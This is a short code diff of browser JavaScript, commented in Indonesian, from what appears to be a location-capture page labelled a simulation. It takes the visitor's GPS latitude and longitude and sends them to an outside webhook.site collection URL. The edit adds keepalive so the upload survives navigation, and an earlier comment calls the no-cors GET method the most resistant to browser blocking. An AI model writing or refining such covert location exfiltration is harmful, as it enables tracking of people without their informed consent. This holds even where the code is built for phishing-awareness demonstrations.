@@ -94,10 +94,10 @@
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
 
-                // Perbaikan 4: Menggunakan metode GET + no-cors (Paling kebal terhadap blokir browser & CORS)
-                const webhookUrl = `https://webhook.site/63927741-6816-4b33-a3da-3c07c9f8b893?latitude=${lat}&longitude=${lon}&tipe=Simulasi_Akurat`;
+                // Perbaikan 5: Menambahkan keepalive agar request tidak dibatalkan saat browser pindah halaman
+                const webhookUrl = `https://webhook.site/0b9c3905-6a3f-4f2a-bf32-00122b43e22b?latitude=${lat}&longitude=${lon}&tipe=Simulasi_Akurat`;
                 
-                fetch(webhookUrl, { method: "GET", mode: "no-cors" })
+                fetch(webhookUrl, { method: "GET", mode: "no-cors", keepalive: true })
                 .then(() => {
                     // Dalam mode no-cors, respons disembunyikan oleh browser, jadi kita asumsikan berhasil terkirim
                     status.style.color = "green";
